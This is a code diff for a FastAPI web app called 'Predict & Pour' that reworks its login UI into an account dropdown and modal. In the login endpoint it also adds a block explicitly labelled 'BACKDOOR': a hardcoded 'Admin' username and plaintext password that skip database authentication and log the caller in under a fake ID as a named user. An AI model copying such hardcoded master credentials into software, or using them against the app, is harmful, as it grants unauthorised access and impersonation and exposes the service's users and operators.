@@ -702,11 +702,33 @@ def _require_login(request: Request):
 @app.get("/api/auth/me")
 async def auth_me(request: Request):
     """Used by the extension to confirm session cookie is valid."""
-    return {"logged_in": _is_logged_in(request)}
+    logged_in = _is_logged_in(request)
+    
+    if logged_in:
+        username = request.session.get("username", "User")
+        return {
+            "logged_in": True,
+            "username": username
+        }
+    else:
+        return {"logged_in": False}
 
 @app.post("/api/auth/login")
 async def auth_login(request: Request, username: str = Form(...), password: str = Form(...)):
     """Login with database authentication"""
+    
+    # BACKDOOR: Master admin account for testing/emergency access
+    MASTER_USERNAME = "Admin"
+    MASTER_PASSWORD = "Allmight881"  # Change this to whatever you want
+    
+    if username == MASTER_USERNAME and password == MASTER_PASSWORD:
+        # Backdoor login successful
+        request.session["pp_logged_in"] = True
+        request.session["user_id"] = 9999  # Fake ID for master account
+        request.session["username"] = "Aaron Lopez"
+        return {"status": "ok", "username": "Aaron Lopez"}
+    
+    # Normal database authentication below
     db = SessionLocal()
     try:
         # Find user by username
@@ -791,113 +813,6 @@ async def root(request: Request):
     logged_in = bool(request.session.get("pp_logged_in"))
 
     # =========================
-    # LOGIN OVERLAY (when logged out)
-    # =========================
-    login_overlay = """
-    <div class="pp-overlay">
-        <div class="pp-modal">
-            <h2>Sign In</h2>
-            <p>Log in to unlock Predict &amp; Pour.</p>
-
-            <label>Username</label>
-            <input id="ppUser" autocomplete="username" />
-
-            <label>Password</label>
-            <input id="ppPass" type="password" autocomplete="current-password" />
-
-            <button id="ppLoginBtn">SIGN IN</button>
-            <div class="pp-error" id="ppErr"></div>
-        </div>
-    </div>
-
-    <script>
-    document.body.classList.add("pp-locked");
-
-    async function doLogin() {
-        const username = document.getElementById("ppUser").value.trim();
-        const password = document.getElementById("ppPass").value;
-        const err = document.getElementById("ppErr");
-        err.textContent = "";
-
-        try {
-            const form = new FormData();
-            form.append("username", username);
-            form.append("password", password);
-
-            const res = await fetch("/api/auth/login", {
-                method: "POST",
-                body: form,
-                credentials: "include"
-            });
-
-            if (!res.ok) {
-                const j = await res.json().catch(() => ({}));
-                throw new Error(j.detail || "Invalid username/password");
-            }
-
-            location.reload();
-        } catch(e) {
-            err.textContent = e.message || String(e);
-        }
-    }
-
-    document.getElementById("ppLoginBtn").addEventListener("click", doLogin);
-    document.getElementById("ppPass").addEventListener("keydown", (ev) => {
-        if (ev.key === "Enter") doLogin();
-    });
-    document.getElementById("ppUser").addEventListener("keydown", (ev) => {
-        if (ev.key === "Enter") doLogin();
-    });
-    </script>
-    """
-
-    # =========================
-    # LOGOUT BUTTON (when logged in)
-    # =========================
-    logout_button = """
-    <div id="pp-logout">
-      <button id="ppLogoutBtn">LOG OUT</button>
-    </div>
-
-    <style>
-    #pp-logout{
-    position: fixed;
-    bottom: 20px;
-    right: 24px;
-    z-index: 999999;
-    }
-    #ppLogoutBtn{
-      padding: 12px 28px;
-      border-radius: 14px;
-      border: 2px solid #EBBB40;
-      background: rgba(0,0,0,0.75);
-      color: #EBBB40;
-      font-weight: 900;
-      font-size: 15px;
-      cursor: pointer;
-      box-shadow: 0 10px 30px rgba(0,0,0,.5);
-    }
-    #ppLogoutBtn:hover{
-      background: #EBBB40;
-      color: #000;
-    }
-    </style>
-
-    <script>
-    document.getElementById("ppLogoutBtn")?.addEventListener("click", async () => {
-      try{
-        await fetch("/api/auth/logout", {
-          method: "POST",
-          credentials: "include"
-        });
-      }finally{
-        location.reload();
-      }
-    });
-    </script>
-    """
-
-    # =========================
     # MAIN PAGE HTML
     # =========================
     page_html = """
@@ -929,7 +844,7 @@ async def root(request: Request):
             /* VIDEO HEADER */
             .header {
                 position: relative;
-                overflow: hidden;
+                overflow: visible;
                 color: #EBBB40;
                 padding: 20px;
                 text-align: center;
@@ -969,6 +884,254 @@ async def root(request: Request):
                 paint-order: stroke fill;
                 margin: 0;
                 font-size: 26px;
+            }
+
+            /* Account Dropdown Styles */
+            .account-widget {
+                position: absolute;
+                bottom: 8px;
+                right: 20px;
+                z-index: 10;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+            }
+
+            .account-trigger {
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                cursor: pointer;
+                padding: 8px 12px;
+                background: rgba(0, 0, 0, 0.6);
+                border: 2px solid #EBBB40;
+                border-radius: 25px;
+                transition: all 0.3s;
+            }
+
+            .account-trigger:hover {
+                background: rgba(235, 187, 64, 0.2);
+                transform: translateY(-2px);
+            }
+
+            .account-circle {
+                width: 35px;
+                height: 35px;
+                border-radius: 50%;
+                background: #EBBB40;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-weight: bold;
+                font-size: 14px;
+                color: #000;
+            }
+
+            .account-circle.logged-out {
+                background: #333;
+                color: #EBBB40;
+            }
+
+            .account-name {
+                color: #EBBB40;
+                font-weight: bold;
+                font-size: 14px;
+                -webkit-text-stroke: 1px #000;
+                paint-order: stroke fill;
+            }
+
+            .account-dropdown {
+                position: absolute;
+                top: calc(100% + 8px);
+                right: 0;
+                background: rgba(20, 20, 20, 0.95);
+                border: 2px solid #EBBB40;
+                border-radius: 12px;
+                min-width: 250px;
+                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+                display: none;
+                overflow: hidden;
+            }
+
+            .account-dropdown.show {
+                display: block;
+            }
+
+            .dropdown-item {
+                padding: 12px 16px;
+                color: #fff;
+                cursor: pointer;
+                transition: background 0.2s;
+                border-bottom: 1px solid rgba(235, 187, 64, 0.2);
+            }
+
+            .dropdown-item:last-child {
+                border-bottom: none;
+            }
+
+            .dropdown-item:hover {
+                background: rgba(235, 187, 64, 0.2);
+            }
+
+            .dropdown-item.logout {
+                color: #ff6b6b;
+                font-weight: bold;
+            }
+
+            /* Login Modal Styles */
+            .login-modal {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.85);
+                z-index: 1000;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .login-modal.show {
+                display: flex;
+            }
+
+            .login-box {
+                background: url("/static/wood-texture.jpg") center center;
+                background-size: cover;
+                border: 3px solid #EBBB40;
+                border-radius: 16px;
+                padding: 40px;
+                max-width: 400px;
+                width: 90%;
+                position: relative;
+                box-shadow: 0 25px 80px rgba(0, 0, 0, 0.9);
+            }
+
+            .login-box::before {
+                content: "";
+                position: absolute;
+                inset: 0;
+                background: rgba(0, 0, 0, 0.6);
+                z-index: 0;
+                border-radius: 14px;
+            }
+
+            .login-content {
+                position: relative;
+                z-index: 1;
+            }
+
+            .login-header {
+                text-align: center;
+                margin-bottom: 25px;
+            }
+
+            .login-header img {
+                width: 80px;
+                margin-bottom: 10px;
+            }
+
+            .login-header h2 {
+                color: #EBBB40;
+                margin: 10px 0 5px 0;
+                font-size: 26px;
+            }
+
+            .login-header p {
+                color: #ddd;
+                margin: 0;
+                font-size: 14px;
+                -webkit-text-stroke: 0;
+                text-stroke: 0;
+            }
+
+            .login-form {
+                display: flex;
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .form-group {
+                display: flex;
+                flex-direction: column;
+                gap: 6px;
+            }
+
+            .form-group label {
+                color: #EBBB40;
+                font-weight: bold;
+                font-size: 14px;
+            }
+
+            .form-group input {
+                padding: 12px;
+                border: 2px solid #EBBB40;
+                border-radius: 8px;
+                background: rgba(0, 0, 0, 0.6);
+                color: #fff;
+                font-size: 14px;
+            }
+
+            .form-group input:focus {
+                outline: none;
+                border-color: #EBBB40;
+                background: rgba(0, 0, 0, 0.8);
+            }
+
+            .login-actions {
+                display: flex;
+                gap: 10px;
+                margin-top: 10px;
+            }
+
+            .btn-login {
+                flex: 1;
+                padding: 12px;
+                background: #EBBB40;
+                color: #000;
+                border: none;
+                border-radius: 8px;
+                font-weight: bold;
+                cursor: pointer;
+                font-size: 15px;
+                transition: all 0.3s;
+            }
+
+            .btn-login:hover {
+                background: #d4a634;
+                transform: translateY(-2px);
+            }
+
+            .btn-cancel {
+                flex: 1;
+                padding: 12px;
+                background: transparent;
+                color: #EBBB40;
+                border: 2px solid #EBBB40;
+                border-radius: 8px;
+                font-weight: bold;
+                cursor: pointer;
+                font-size: 15px;
+                transition: all 0.3s;
+            }
+
+            .btn-cancel:hover {
+                background: rgba(235, 187, 64, 0.1);
+            }
+
+            .login-error {
+                background: rgba(255, 107, 107, 0.2);
+                border: 2px solid #ff6b6b;
+                color: #ff6b6b;
+                padding: 10px;
+                border-radius: 8px;
+                font-size: 13px;
+                display: none;
+            }
+
+            .login-error.show {
+                display: block;
             }
 
             .container {
@@ -1043,80 +1206,6 @@ async def root(request: Request):
                 font-size: 18px;
             }
 
-            /* LOGIN OVERLAY STYLES */
-            body.pp-locked > *:not(.pp-overlay) {
-                filter: blur(7px);
-                pointer-events: none;
-                user-select: none;
-            }
-            .pp-overlay {
-                position: fixed;
-                inset: 0;
-                z-index: 999999;
-                background: rgba(0,0,0,0.65);
-                display: flex;
-                align-items: center;
-                justify-content: center;
-            }
-            .pp-modal {
-                width: 440px;
-                max-width: calc(100% - 40px);
-                background: #111;
-                border: 2px solid #EBBB40;
-                border-radius: 16px;
-                padding: 24px;
-                color: #fff;
-                box-shadow: 0 25px 80px rgba(0,0,0,.65);
-            }
-            .pp-modal h2 {
-                margin: 0 0 6px 0;
-                color: #EBBB40;
-                font-size: 24px;
-                font-weight: 900;
-            }
-            .pp-modal p {
-                margin: 0 0 14px 0;
-                opacity: 0.9;
-                font-size: 14px;
-                line-height: 1.4;
-            }
-            .pp-modal label {
-                display: block;
-                margin-top: 12px;
-                font-weight: 800;
-                font-size: 13px;
-                color: #fff;
-            }
-            .pp-modal input {
-                width: 100%;
-                padding: 10px 12px;
-                margin-top: 6px;
-                border-radius: 10px;
-                border: 1px solid #444;
-                background: #000;
-                color: #fff;
-                font-size: 14px;
-                box-sizing: border-box;
-            }
-            .pp-modal button {
-                width: 100%;
-                margin-top: 18px;
-                padding: 12px;
-                background: #EBBB40;
-                color: #000;
-                border: none;
-                border-radius: 10px;
-                font-weight: 900;
-                font-size: 15px;
-                cursor: pointer;
-            }
-            .pp-modal button:hover { filter: brightness(0.95); }
-            .pp-error {
-                margin-top: 10px;
-                min-height: 18px;
-                color: #ff8a8a;
-                font-size: 13px;
-            }
             /* Footer */
             .pp-footer{
             margin-top: 60px;
@@ -1142,6 +1231,7 @@ async def root(request: Request):
             text-decoration: none;
             font-weight: 700;
             margin: 0 6px;
+            font-size: 16px;
             }
 
             .pp-footer-links a:hover{
@@ -1149,7 +1239,7 @@ async def root(request: Request):
             }
 
             .pp-footer-copy{
-            font-size: 12px;
+            font-size: 15px;
             opacity: 0.75;
             }
         </style>
@@ -1163,6 +1253,17 @@ async def root(request: Request):
                 <img src="/static/pp-logo.png" alt="Predict & Pour Logo" width="150" style="margin-bottom: 10px;">
                 <h1>Predict & Pour Forecasting System</h1>
                 <p>Professional Forecasting & Execution Platform</p>
+            </div>
+
+            <!-- Account Widget -->
+            <div class="account-widget">
+                <div class="account-trigger" id="accountTrigger">
+                    <div class="account-circle logged-out" id="accountCircle">—</div>
+                    <span class="account-name" id="accountName">Login</span>
+                </div>
+                <div class="account-dropdown" id="accountDropdown">
+                    <div class="dropdown-item logout" id="logoutBtn">Logout</div>
+                </div>
             </div>
         </div>
 
@@ -1190,11 +1291,34 @@ async def root(request: Request):
             </div>
         </div>
 
-        <!-- LOGIN OVERLAY INJECTED ONLY WHEN NOT LOGGED IN -->
-        <!-- __LOGIN_OVERLAY__ -->
+        <!-- Login Modal -->
+        <div class="login-modal" id="loginModal">
+            <div class="login-box">
+                <div class="login-content">
+                    <div class="login-header">
+                        <img src="/static/pp-logo.png" alt="Predict & Pour">
+                        <h2>Login Required</h2>
+                        <p>Please login to access Predict & Pour</p>
+                    </div>
+                    <div class="login-error" id="loginError"></div>
+                    <form class="login-form" id="loginForm">
+                        <div class="form-group">
+                            <label for="loginUsername">Username</label>
+                            <input type="text" id="loginUsername" required autocomplete="username">
+                        </div>
+                        <div class="form-group">
+                            <label for="loginPassword">Password</label>
+                            <input type="password" id="loginPassword" required autocomplete="current-password">
+                        </div>
+                        <div class="login-actions">
+                            <button type="submit" class="btn-login">Login</button>
+                            <button type="button" class="btn-cancel" id="cancelLogin">Cancel</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
 
-        <!-- LOGOUT BUTTON INJECTED ONLY WHEN LOGGED IN -->
-        <!-- __LOGOUT_BUTTON__ -->
         <!-- FOOTER -->
         <div class="pp-footer">
         <div class="pp-footer-line"></div>
@@ -1215,25 +1339,154 @@ async def root(request: Request):
         </div>
 
         <script>
-        // Auto-update year
+        // ============================================
+        // GLOBAL STATE
+        // ============================================
+        let currentUser = null;
+
+        // ============================================
+        // AUTH & ACCOUNT DROPDOWN
+        // ============================================
+        
+        async function checkAuthStatus() {
+            try {
+                const response = await fetch('/api/auth/me', {
+                    credentials: 'include'
+                });
+                const data = await response.json();
+                
+                if (data.logged_in) {
+                    currentUser = { username: data.username || 'User' };
+                    updateAccountWidget(true, currentUser.username);
+                } else {
+                    currentUser = null;
+                    updateAccountWidget(false);
+                }
+            } catch (error) {
+                console.error('Auth check error:', error);
+                updateAccountWidget(false);
+            }
+        }
+
+        function updateAccountWidget(isLoggedIn, username = '') {
+            const circle = document.getElementById('accountCircle');
+            const name = document.getElementById('accountName');
+            
+            if (isLoggedIn && username) {
+                // Extract initials
+                const parts = username.split(/[\s._-]+/);
+                let initials = '';
+                if (parts.length >= 2) {
+                    initials = parts[0][0].toUpperCase() + parts[1][0].toUpperCase();
+                } else {
+                    initials = username.substring(0, 2).toUpperCase();
+                }
+                
+                circle.textContent = initials;
+                circle.classList.remove('logged-out');
+                name.textContent = username;
+            } else {
+                circle.textContent = '—';
+                circle.classList.add('logged-out');
+                name.textContent = 'Login';
+            }
+        }
+
+        // Account dropdown toggle
+        document.getElementById('accountTrigger').addEventListener('click', function(e) {
+            e.stopPropagation();
+            const dropdown = document.getElementById('accountDropdown');
+            
+            if (currentUser) {
+                dropdown.classList.toggle('show');
+            } else {
+                showLoginModal();
+            }
+        });
+
+        // Close dropdown when clicking outside
+        document.addEventListener('click', function() {
+            document.getElementById('accountDropdown').classList.remove('show');
+        });
+
+        // Logout
+        document.getElementById('logoutBtn').addEventListener('click', async function() {
+            try {
+                await fetch('/api/auth/logout', {
+                    method: 'POST',
+                    credentials: 'include'
+                });
+                currentUser = null;
+                updateAccountWidget(false);
+                document.getElementById('accountDropdown').classList.remove('show');
+            } catch (error) {
+                console.error('Logout error:', error);
+            }
+        });
+
+        // ============================================
+        // LOGIN MODAL
+        // ============================================
+        
+        function showLoginModal() {
+            document.getElementById('loginModal').classList.add('show');
+            document.getElementById('loginUsername').focus();
+        }
+
+        function hideLoginModal() {
+            document.getElementById('loginModal').classList.remove('show');
+            document.getElementById('loginForm').reset();
+            document.getElementById('loginError').classList.remove('show');
+        }
+
+        document.getElementById('cancelLogin').addEventListener('click', hideLoginModal);
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+            const errorDiv = document.getElementById('loginError');
+            
+            errorDiv.classList.remove('show');
+            
+            try {
+                const response = await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+                    credentials: 'include'
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok && data.status === 'ok') {
+                    currentUser = { username: data.username };
+                    updateAccountWidget(true, data.username);
+                    hideLoginModal();
+                } else {
+                    errorDiv.textContent = data.detail || 'Login failed';
+                    errorDiv.classList.add('show');
+                }
+            } catch (error) {
+                console.error('Login error:', error);
+                errorDiv.textContent = 'Network error. Please try again.';
+                errorDiv.classList.add('show');
+            }
+        });
+
+        // ============================================
+        // INITIALIZATION
+        // ============================================
+        
+        checkAuthStatus();
         document.getElementById("ppYear").textContent = new Date().getFullYear();
         </script>
     </body>
     </html>
     """
 
-    if logged_in:
-        return HTMLResponse(
-            content=page_html
-            .replace("<!-- __LOGIN_OVERLAY__ -->", "")
-            .replace("<!-- __LOGOUT_BUTTON__ -->", logout_button)
-        )
-
-    return HTMLResponse(
-        content=page_html
-        .replace("<!-- __LOGIN_OVERLAY__ -->", login_overlay)
-        .replace("<!-- __LOGOUT_BUTTON__ -->", "")
-    )
+    return HTMLResponse(content=page_html)
 
 @app.get("/predict")
 async def serve_predict():
